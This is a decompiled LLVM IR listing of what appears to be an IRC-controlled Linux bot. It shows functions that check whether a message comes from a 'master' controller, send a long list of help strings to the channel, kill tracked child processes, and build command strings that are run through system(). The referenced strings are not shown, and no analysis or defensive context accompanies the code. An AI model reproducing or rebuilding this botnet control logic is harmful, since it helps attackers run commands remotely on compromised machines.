dec_label_pc_80532c5:                             ; preds = %dec_label_pc_805326a
  %v0_80532c8 = load i32, i32* @ebp, align 4
  %v2_80532c8 = add nsw i32 %storemerge5104, -5188
  %v3_80532c8 = add i32 %v2_80532c8, %v0_80532c8
  %v4_80532c8 = inttoptr i32 %v3_80532c8 to i8*
  %v5_80532c8 = load i8, i8* %v4_80532c8, align 1
  %v0_80532d4 = load i32, i32* @esp, align 4
  %v5_80532d4 = icmp ult i32 %v0_80532d4, 8
  store i1 %v5_80532d4, i1* %cf.global-to-local, align 1
  %v5_80532db = call i32 @__GI_fputc(i8 %v5_80532c8, i32 %v4_80530c3)
  %v0_80532e0 = load i32, i32* @esp, align 4
  %v2_80532e0 = icmp ugt i32 %v0_80532e0, -17
  store i1 %v2_80532e0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80532e3

dec_label_pc_80532e3:                             ; preds = %dec_label_pc_80532a5, %dec_label_pc_805328a, %dec_label_pc_80532c5
  %v4_80532e3 = add nuw nsw i32 %storemerge5104, 1
  %v10_80532e9 = icmp ult i32 %v4_80532e3, %v6_8053238108
  store i1 %v10_80532e9, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_80532e3, %v6_8053238108
  br i1 %exitcond, label %dec_label_pc_8053227.loopexit, label %dec_label_pc_805326a

dec_label_pc_80532f7:                             ; preds = %dec_label_pc_8053227.loopexit, %dec_label_pc_805320b
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %tmp87 = inttoptr i32 %v4_80530c3 to i16*
  %v3_80532fd = call i32 @__GI_fclose(i16* %tmp87)
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_805330b = call i32 @close(i32 %v5_8052e91)
  %v2_8053319 = load i32, i32* %v1_80530b8, align 4
  store i32 %v2_8053319, i32* %edx.global-to-local, align 4
  store i1 %v5_80530b5, i1* %cf.global-to-local, align 1
  %v2_805332a = ptrtoint i32* %stack_var_-5447 to i32
  %v4_8053331 = call i32 @sprintf(i32 %v2_805332a, i32 ptrtoint ([21 x i8]* @global_var_806aa6b.536 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8053343 = call i32 @system(i32 %v2_805332a)
  %v2_8053351 = load i32, i32* %v1_80530b8, align 4
  store i32 %v2_8053351, i32* %edx.global-to-local, align 4
  store i1 %v5_80530b5, i1* %cf.global-to-local, align 1
  %v2_8053362 = ptrtoint i32* %stack_var_-5702 to i32
  %v4_8053369 = call i32 @sprintf(i32 %v2_8053362, i32 ptrtoint ([6 x i8]* @global_var_806aa80.537 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_805337b = call i32 @system(i32 %v2_8053362)
  store i1 %v5_805303f, i1* %cf.global-to-local, align 1
  %v2_8053394 = ptrtoint i32* %stack_var_-5957 to i32
  %v4_805339b = call i32 @sprintf(i32 %v2_8053394, i32 ptrtoint ([22 x i8]* @global_var_806aa86.538 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_80533ad = call i32 @system(i32 %v2_8053394)
  store i1 %v5_805303f, i1* %cf.global-to-local, align 1
  %v2_80533c6 = ptrtoint i32* %stack_var_-6212 to i32
  %v4_80533cd = call i32 @sprintf(i32 %v2_80533c6, i32 ptrtoint ([18 x i8]* @global_var_806aa9c.539 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_80533df = call i32 @system(i32 %v2_80533c6)
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_80533ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80533f1

dec_label_pc_80533f1:                             ; preds = %entry, %dec_label_pc_80532f7
  %v0_80533f7 = phi i32 [ %v2_8052e52, %entry ], [ %v2_80533ec, %dec_label_pc_80532f7 ]
  ret i32 %v0_80533f7

; uselistorder directives
  uselistorder i32 %storemerge5104, { 0, 3, 2, 1 }
  uselistorder i32 %v4_805324d, { 1, 0 }
  uselistorder i32 %v6_8053238108, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_805327d.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_80531f7, { 1, 0, 2 }
  uselistorder i32 %v4_80531e6, { 1, 2, 0 }
  uselistorder i32 %storemerge13.in117, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8053150, { 1, 0 }
  uselistorder i32 %v7_805314e, { 1, 0 }
  uselistorder i32 %storemerge7126, { 2, 0, 3, 1 }
  uselistorder i32 %v4_80530f4, { 1, 0 }
  uselistorder i32 %v6_80530df130, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_80530d5, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v4_80530c3, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i1 %v5_805303f, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052fb5, { 1, 0, 2 }
  uselistorder i32 %storemerge8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8052f56.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_8052ef9, { 1, 0 }
  uselistorder i32 %v5_8052e91, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8052e62, { 1, 0 }
  uselistorder i1 %v5_8052e4c, { 6, 7, 8, 9, 10, 11, 1, 5, 4, 0, 12, 3, 2, 13 }
  uselistorder i32* %stack_var_-6252, { 3, 0, 1, 2, 6, 4, 5 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 21, 15, 16, 17, 18, 19, 20, 2, 22, 23, 74, 24, 25, 36, 32, 26, 27, 28, 29, 30, 31, 1, 33, 34, 35, 0, 37, 38, 3, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 4095, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_8068d40.45 to i32), { 0, 2, 3, 1 }
  uselistorder i8 47, { 0, 2, 1, 3 }
  uselistorder i32 -1092, { 2, 0, 3, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 16, 0, 1, 2, 17, 3, 4, 5, 6, 7, 8, 9, 18, 10, 19, 11, 20, 21, 12, 13, 14, 15 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 4, 0, 5, 6, 1, 3, 2, 7, 8, 9, 10 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 3, 2, 4, 5, 0, 1 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80533f1, { 1, 0 }
  uselistorder label %dec_label_pc_80532e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805324d, { 1, 0 }
  uselistorder label %dec_label_pc_805320b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80531e6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805316d, { 1, 0 }
  uselistorder label %dec_label_pc_8053114, { 1, 0 }
  uselistorder label %dec_label_pc_80530f4, { 1, 0 }
  uselistorder label %dec_label_pc_8053074, { 1, 0 }
  uselistorder label %dec_label_pc_8053026, { 1, 0 }
  uselistorder label %dec_label_pc_8053001, { 1, 0 }
  uselistorder label %dec_label_pc_8052f53, { 1, 0 }
  uselistorder label %dec_label_pc_8052f47, { 1, 0 }
  uselistorder label %dec_label_pc_8052ec2, { 1, 0 }
  uselistorder label %dec_label_pc_8052e88, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8053404 = call i32 @mfork(i32 %arg2)
  %v1_805340c = icmp eq i32 %v1_8053404, 0
  %v1_805340e = icmp eq i1 %v1_805340c, false
  br i1 %v1_805340e, label %dec_label_pc_8053ad1, label %dec_label_pc_8053414

dec_label_pc_8053414:                             ; preds = %entry
  %v3_8053422 = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806aab0.540 to i32))
  %v1_805342f = call i32 @sleep(i32 3)
  %v3_8053445 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_806aae8.541 to i32))
  %v1_8053452 = call i32 @sleep(i32 0)
  %v3_8053468 = call i32 @Send(i32 %arg1, i32 ptrtoint ([70 x i8]* @global_var_806ab2c.542 to i32))
  %v1_8053475 = call i32 @sleep(i32 0)
  %v3_805348b = call i32 @Send(i32 %arg1, i32 ptrtoint ([71 x i8]* @global_var_806ab74.543 to i32))
  %v1_8053498 = call i32 @sleep(i32 0)
  %v3_80534ae = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_806abbc.544 to i32))
  %v1_80534bb = call i32 @sleep(i32 0)
  %v3_80534d1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_806a138.257 to i32))
  %v1_80534de = call i32 @sleep(i32 0)
  %v3_80534f4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([56 x i8]* @global_var_806ac4c.545 to i32))
  %v1_8053501 = call i32 @sleep(i32 0)
  %v3_8053517 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_806ac84.546 to i32))
  %v1_8053524 = call i32 @sleep(i32 3)
  %v3_805353a = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806aca8.547 to i32))
  %v1_8053547 = call i32 @sleep(i32 0)
  %v3_805355d = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_806ace0.548 to i32))
  %v1_805356a = call i32 @sleep(i32 0)
  %v3_8053580 = call i32 @Send(i32 %arg1, i32 ptrtoint ([162 x i8]* @global_var_806ad48.549 to i32))
  %v1_805358d = call i32 @sleep(i32 0)
  %v3_80535a3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([137 x i8]* @global_var_806adec.550 to i32))
  %v1_80535b0 = call i32 @sleep(i32 0)
  %v3_80535c6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([120 x i8]* @global_var_806ae78.551 to i32))
  %v1_80535d3 = call i32 @sleep(i32 0)
  %v3_80535e9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([81 x i8]* @global_var_806aef0.552 to i32))
  %v1_80535f6 = call i32 @sleep(i32 0)
  %v3_805360c = call i32 @Send(i32 %arg1, i32 ptrtoint ([168 x i8]* @global_var_806af44.553 to i32))
  %v1_8053619 = call i32 @sleep(i32 0)
  %v3_805362f = call i32 @Send(i32 %arg1, i32 ptrtoint ([148 x i8]* @global_var_806afec.554 to i32))
  %v1_805363c = call i32 @sleep(i32 0)
  %v3_8053652 = call i32 @Send(i32 %arg1, i32 ptrtoint ([110 x i8]* @global_var_806b080.555 to i32))
  %v1_805365f = call i32 @sleep(i32 0)
  %v3_8053675 = call i32 @Send(i32 %arg1, i32 ptrtoint ([208 x i8]* @global_var_806b0f0.556 to i32))
  %v1_8053682 = call i32 @sleep(i32 0)
  %v3_8053698 = call i32 @Send(i32 %arg1, i32 ptrtoint ([155 x i8]* @global_var_806b1c0.557 to i32))
  %v1_80536a5 = call i32 @sleep(i32 0)
  %v3_80536bb = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_806b25b.558 to i32))
  %v1_80536c8 = call i32 @sleep(i32 3)
  %v3_80536de = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_806b278.559 to i32))
  %v1_80536eb = call i32 @sleep(i32 0)
  %v3_8053701 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b2b8.560 to i32))
  %v1_805370e = call i32 @sleep(i32 0)
  %v3_8053724 = call i32 @Send(i32 %arg1, i32 ptrtoint ([57 x i8]* @global_var_806b2ec.561 to i32))
  %v1_8053731 = call i32 @sleep(i32 0)
  %v3_8053747 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_806b328.562 to i32))
  %v1_8053754 = call i32 @sleep(i32 0)
  %v3_805376a = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b358.563 to i32))
  %v1_8053777 = call i32 @sleep(i32 0)
  %v3_805378d = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806b38c.564 to i32))
  %v1_805379a = call i32 @sleep(i32 0)
  %v3_80537b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([62 x i8]* @global_var_806b3c8.565 to i32))
  %v1_80537bd = call i32 @sleep(i32 0)
  %v3_80537d3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_806b408.566 to i32))
  %v1_80537e0 = call i32 @sleep(i32 0)
  %v3_80537f6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_806b444.567 to i32))
  %v1_8053803 = call i32 @sleep(i32 0)
  %v3_8053819 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806b494.568 to i32))
  %v1_8053826 = call i32 @sleep(i32 0)
  %v3_805383c = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806a6af.514 to i32))
  %v1_8053849 = call i32 @sleep(i32 0)
  %v3_805385f = call i32 @Send(i32 %arg1, i32 ptrtoint ([97 x i8]* @global_var_806b4b8.569 to i32))
  %v1_805386c = call i32 @sleep(i32 0)
  %v3_8053882 = call i32 @Send(i32 %arg1, i32 ptrtoint ([62 x i8]* @global_var_806b51c.570 to i32))
  %v1_805388f = call i32 @sleep(i32 0)
  %v3_80538a5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([104 x i8]* @global_var_806b55c.571 to i32))
  %v1_80538b2 = call i32 @sleep(i32 0)
  %v3_80538c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_806b5c4.572 to i32))
  %v1_80538d5 = call i32 @sleep(i32 0)
  %v3_80538eb = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806b5f8.573 to i32))
  %v1_80538f8 = call i32 @sleep(i32 0)
  %v3_805390e = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_806b62c.574 to i32))
  %v1_805391b = call i32 @sleep(i32 0)
  %v3_8053931 = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_806b650.575 to i32))
  %v1_805393e = call i32 @sleep(i32 0)
  %v3_8053954 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_806b690.576 to i32))
  %v1_8053961 = call i32 @sleep(i32 0)
  %v3_8053977 = call i32 @Send(i32 %arg1, i32 ptrtoint ([62 x i8]* @global_var_806b6c0.577 to i32))
  %v1_8053984 = call i32 @sleep(i32 0)
  %v3_805399a = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_806b700.578 to i32))
  %v1_80539a7 = call i32 @sleep(i32 0)
  %v3_80539bd = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806b744.579 to i32))
  %v1_80539ca = call i32 @sleep(i32 0)
  %v3_80539e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_806b77c.580 to i32))
  %v1_80539ed = call i32 @sleep(i32 0)
  %v3_8053a03 = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806b7d4.581 to i32))
  %v1_8053a10 = call i32 @sleep(i32 0)
  %v3_8053a26 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_806b80c.582 to i32))
  %v1_8053a33 = call i32 @sleep(i32 0)
  %v3_8053a49 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_806b860.583 to i32))
  %v1_8053a56 = call i32 @sleep(i32 0)
  %v3_8053a6c = call i32 @Send(i32 %arg1, i32 ptrtoint ([76 x i8]* @global_var_806b8bc.584 to i32))
  %v1_8053a79 = call i32 @sleep(i32 0)
  %v3_8053a8f = call i32 @Send(i32 %arg1, i32 ptrtoint ([98 x i8]* @global_var_806b908.585 to i32))
  %v1_8053a9c = call i32 @sleep(i32 0)
  %v3_8053ab2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([107 x i8]* @global_var_806b96c.586 to i32))
  %v1_8053abf = call i32 @sleep(i32 0)
  %v1_8053acc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053ad1

dec_label_pc_8053ad1:                             ; preds = %entry, %dec_label_pc_8053414
  %v0_8053ad2 = phi i32 [ %v1_8053404, %entry ], [ %v1_8053acc, %dec_label_pc_8053414 ]
  ret i32 %v0_8053ad2

; uselistorder directives
  uselistorder i32 %arg1, { 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053ad1, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053ad3 = load i32, i32* @ebp, align 4
  store i32 %v0_8053ad3, i32* %stack_var_-4, align 4
  %v4_8053ad3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8053ad3, i32* @ebp, align 4
  %v4_8053b17 = icmp eq i32 %arg2, 0
  %v0_8053b6614 = load i32, i32* @global_var_807407c.31, align 4
  %v10_8053b6b16 = icmp eq i32 %v0_8053b6614, 0
  br i1 %v10_8053b6b16, label %dec_label_pc_8053b74, label %dec_label_pc_8053ae6

dec_label_pc_8053ae6:                             ; preds = %entry, %dec_label_pc_8053b63
  %storemerge20 = phi i32 [ %v4_8053b63, %dec_label_pc_8053b63 ], [ 0, %entry ]
  %v2_8053ae9 = mul i32 %storemerge20, 4
  %v0_8053aee = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8053af3 = add i32 %v0_8053aee, %v2_8053ae9
  %v1_8053af6 = inttoptr i32 %v2_8053af3 to i32*
  %v2_8053af6 = load i32, i32* %v1_8053af6, align 4
  %v1_8053af8 = icmp eq i32 %v2_8053af6, 0
  br i1 %v1_8053af8, label %dec_label_pc_8053b63, label %dec_label_pc_8053afc

dec_label_pc_8053afc:                             ; preds = %dec_label_pc_8053ae6
  %v2_8053b0c = load i32, i32* %v1_8053af6, align 4
  store i32 %v2_8053b0c, i32* @ebx, align 4
  %v1_8053b0e = call i32 @__libc_getpid(i32 %storemerge20)
  %v0_8053b13 = load i32, i32* @ebx, align 4
  %v12_8053b13 = icmp eq i32 %v0_8053b13, %v1_8053b0e
  br i1 %v12_8053b13, label %dec_label_pc_8053b63, label %dec_label_pc_8053b17

dec_label_pc_8053b17:                             ; preds = %dec_label_pc_8053afc
  br i1 %v4_8053b17, label %dec_label_pc_8053b17.dec_label_pc_8053b43_crit_edge, label %dec_label_pc_8053b1d

dec_label_pc_8053b17.dec_label_pc_8053b43_crit_edge: ; preds = %dec_label_pc_8053b17
  br label %dec_label_pc_8053b43

dec_label_pc_8053b1d:                             ; preds = %dec_label_pc_8053b17
  %v3_8053b3b = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806b9d7.587 to i32))
  br label %dec_label_pc_8053b43

dec_label_pc_8053b43:                             ; preds = %dec_label_pc_8053b17.dec_label_pc_8053b43_crit_edge, %dec_label_pc_8053b1d
  %v0_8053b4b = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8053b50 = add i32 %v0_8053b4b, %v2_8053ae9
  %v1_8053b53 = inttoptr i32 %v2_8053b50 to i32*
  %v2_8053b53 = load i32, i32* %v1_8053b53, align 4
  %v3_8053b5b = call i32 @kill(i32 %v2_8053b53, i32 9)
  br label %dec_label_pc_8053b63

dec_label_pc_8053b63:                             ; preds = %dec_label_pc_8053afc, %dec_label_pc_8053ae6, %dec_label_pc_8053b43
  %v4_8053b63 = add i32 %storemerge20, 1
  %v0_8053b66 = load i32, i32* @global_var_807407c.31, align 4
  %v10_8053b6b = icmp ult i32 %v4_8053b63, %v0_8053b66
  br i1 %v10_8053b6b, label %dec_label_pc_8053ae6, label %dec_label_pc_8053b66.dec_label_pc_8053b74_crit_edge

dec_label_pc_8053b66.dec_label_pc_8053b74_crit_edge: ; preds = %dec_label_pc_8053b63
  br label %dec_label_pc_8053b74

dec_label_pc_8053b74:                             ; preds = %entry, %dec_label_pc_8053b66.dec_label_pc_8053b74_crit_edge
  %v0_8053b66.lcssa = phi i32 [ %v0_8053b66, %dec_label_pc_8053b66.dec_label_pc_8053b74_crit_edge ], [ 0, %entry ]
  ret i32 %v0_8053b66.lcssa

; uselistorder directives
  uselistorder i32 %v4_8053b63, { 1, 0 }
  uselistorder i32 %v2_8053ae9, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8053b74, { 1, 0 }
  uselistorder label %dec_label_pc_8053b63, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053b43, { 1, 0 }
  uselistorder label %dec_label_pc_8053ae6, { 1, 0 }
}

define i32 @killd() local_unnamed_addr {
entry:
  %stack_var_-1028 = alloca i32, align 4
  %v2_8053b82 = ptrtoint i32* %stack_var_-1028 to i32
  %v4_8053b94 = bitcast i32* %stack_var_-1028 to i8*
  %v5_8053b94 = call i32 @__GI_memset(i8* %v4_8053b94, i32 0, i32 1024)
  %v0_8053b9c = load i8, i8* @global_var_8074070.28, align 16
  %v1_8053b9c = zext i8 %v0_8053b9c to i32
  %v3_8053b9c = and i32 %v5_8053b94, -256
  %v4_8053b9c = or i32 %v1_8053b9c, %v3_8053b9c
  %v10_8053ba1 = icmp eq i8 %v0_8053b9c, 1
  br i1 %v10_8053ba1, label %dec_label_pc_8053bde, label %dec_label_pc_8053ba5

dec_label_pc_8053ba5:                             ; preds = %entry
  %v3_8053bba = call i32 @sprintf(i32 %v2_8053b82, i32 ptrtoint ([21 x i8]* @global_var_806b9f3.589 to i32))
  %v1_8053bcc = call i32 @system(i32 %v2_8053b82)
  %v1_8053bd9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053bde

dec_label_pc_8053bde:                             ; preds = %entry, %dec_label_pc_8053ba5
  %v0_8053bdf = phi i32 [ %v4_8053b9c, %entry ], [ %v1_8053bd9, %dec_label_pc_8053ba5 ]
  ret i32 %v0_8053bdf

; uselistorder directives
  uselistorder i32 (i32)* @system, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053bde, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053be0 = load i32, i32* @ebp, align 4
  store i32 %v0_8053be0, i32* %stack_var_-4, align 4
  %v4_8053be0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8053be0, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-8, align 4
  %v2_8053bf8 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8053bfc = call i32 @__GI_asprintf(i32 %v2_8053bf8, i32 ptrtoint ([5 x i8]* @global_var_806ba08.590 to i32), i32 %arg1, i32 %arg2)
  %v3_8053c04 = load i32, i32* %stack_var_-8, align 4
  %v2_8053c07 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053c07, i32* @ebp, align 4
  ret i32 %v3_8053c04

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
}

define i32 @ismaster(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp8 = ptrtoint i32* %arg2 to i32
  %v5_8053c7823 = icmp sgt i32 %arg3, 0
  br i1 %v5_8053c7823, label %dec_label_pc_8053c19.lr.ph, label %dec_label_pc_8053c81

dec_label_pc_8053c19.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8053c19

dec_label_pc_8053c19:                             ; preds = %dec_label_pc_8053c19.lr.ph, %dec_label_pc_8053c6f
  %storemerge124 = phi i32 [ 0, %dec_label_pc_8053c19.lr.ph ], [ %v4_8053c6f, %dec_label_pc_8053c6f ]
  %v2_8053c1c = mul i32 %storemerge124, 4
  %v5_8053c1f = add i32 %v2_8053c1c, %tmp8
  %v1_8053c22 = inttoptr i32 %v5_8053c1f to i32*
  %v2_8053c22 = load i32, i32* %v1_8053c22, align 4
  %v2_8053c2d = call i32 @append(i32 %v2_8053c22, i32 ptrtoint (i32* @global_var_806ba0d.591 to i32))
  store i1 false, i1* @df, align 1
  %v4_8053c46 = inttoptr i32 %v2_8053c2d to i8*
  store i32 %v2_8053c2d, i32* @edi, align 4
  %v3_8053c49 = call i32 @_strlen(i8* %v4_8053c46)
  store i32 %v3_8053c49, i32* @eax, align 4
  %v4_8053c5a = call i32 @__GI_strncmp(i8* %v4_8053c46, i32 %arg1, i32 %v3_8053c49)
  %v1_8053c62 = icmp eq i32 %v4_8053c5a, 0
  %v1_8053c64 = icmp eq i1 %v1_8053c62, false
  br i1 %v1_8053c64, label %dec_label_pc_8053c6f, label %dec_label_pc_8053c81

dec_label_pc_8053c6f:                             ; preds = %dec_label_pc_8053c19
  %v4_8053c6f = add nuw nsw i32 %storemerge124, 1
  %v5_8053c78 = icmp slt i32 %v4_8053c6f, %arg3
  br i1 %v5_8053c78, label %dec_label_pc_8053c19, label %dec_label_pc_8053c81

dec_label_pc_8053c81:                             ; preds = %dec_label_pc_8053c19, %dec_label_pc_8053c6f, %entry
  %storemerge = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8053c6f ], [ 1, %dec_label_pc_8053c19 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8053c49, { 1, 0 }
  uselistorder i32 %v2_8053c2d, { 1, 0 }
  uselistorder i32 %storemerge124, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8053c81, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053c19, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %tmp111 = inttoptr i32 %arg3 to i8*
  %stack_var_-2168 = alloca i32, align 4
  %stack_var_-1144 = alloca i32, align 4
  %v0_8053c94 = load i32, i32* @global_var_806f06c.592, align 4
  %v4_8053ca2 = ptrtoint i8* %arg2 to i32
  %v5_8053ca5 = call i32 @ismaster(i32 %v4_8053ca2, i32* bitcast ([3 x i8]** @global_var_806f070.594 to i32*), i32 %v0_8053c94)
  %v1_8053cad = icmp eq i32 %v5_8053ca5, 0
  br i1 %v1_8053cad, label %dec_label_pc_8054ab3, label %dec_label_pc_8053cc1.preheader

dec_label_pc_8053cc1.preheader:                   ; preds = %entry
  br label %dec_label_pc_8053cc1

dec_label_pc_8053cbe:                             ; preds = %dec_label_pc_8053ce6
  %v4_8053cbe = add i32 %storemerge12, 1
  br label %dec_label_pc_8053cc1

dec_label_pc_8053cc1:                             ; preds = %dec_label_pc_8053cc1.preheader, %dec_label_pc_8053cbe
  %storemerge12 = phi i32 [ %v4_8053cbe, %dec_label_pc_8053cbe ], [ 0, %dec_label_pc_8053cc1.preheader ]
  store i32 %storemerge12, i32* %edx.global-to-local, align 4
  %v3_8053cdb = call i32 @_strlen(i8* %tmp111)
  %v7_8053ce2 = icmp ult i32 %storemerge12, %v3_8053cdb
  %v1_8053ce4 = icmp eq i1 %v7_8053ce2, false
  %.pre = add i32 %storemerge12, %arg3
  br i1 %v1_8053ce4, label %dec_label_pc_8053cc1.dec_label_pc_8053cf2_crit_edge, label %dec_label_pc_8053ce6

dec_label_pc_8053cc1.dec_label_pc_8053cf2_crit_edge: ; preds = %dec_label_pc_8053cc1
  %.pre89 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8053cf2

dec_label_pc_8053ce6:                             ; preds = %dec_label_pc_8053cc1
  %v1_8053cec = inttoptr i32 %.pre to i8*
  %v2_8053cec = load i8, i8* %v1_8053cec, align 1
  %v7_8053cee = icmp eq i8 %v2_8053cec, 32
  %v1_8053cf0 = icmp eq i1 %v7_8053cee, false
  br i1 %v1_8053cf0, label %dec_label_pc_8053cbe, label %dec_label_pc_8053cf2

dec_label_pc_8053cf2:                             ; preds = %dec_label_pc_8053ce6, %dec_label_pc_8053cc1.dec_label_pc_8053cf2_crit_edge
  %v1_8053cf8.pre-phi = phi i8* [ %.pre89, %dec_label_pc_8053cc1.dec_label_pc_8053cf2_crit_edge ], [ %v1_8053cec, %dec_label_pc_8053ce6 ]
  store i8 0, i8* %v1_8053cf8.pre-phi, align 1
  %v1_8053d07 = add i32 %.pre, 2
  %v5_8053d0a = inttoptr i32 %v1_8053d07 to i8*
  store i8* %v5_8053d0a, i8** %stack_var_-64, align 4
  br label %dec_label_pc_8053d19

dec_label_pc_8053d16:                             ; preds = %dec_label_pc_8053d3e
  %v4_8053d16 = add i32 %storemerge11, 1
  br label %dec_label_pc_8053d19

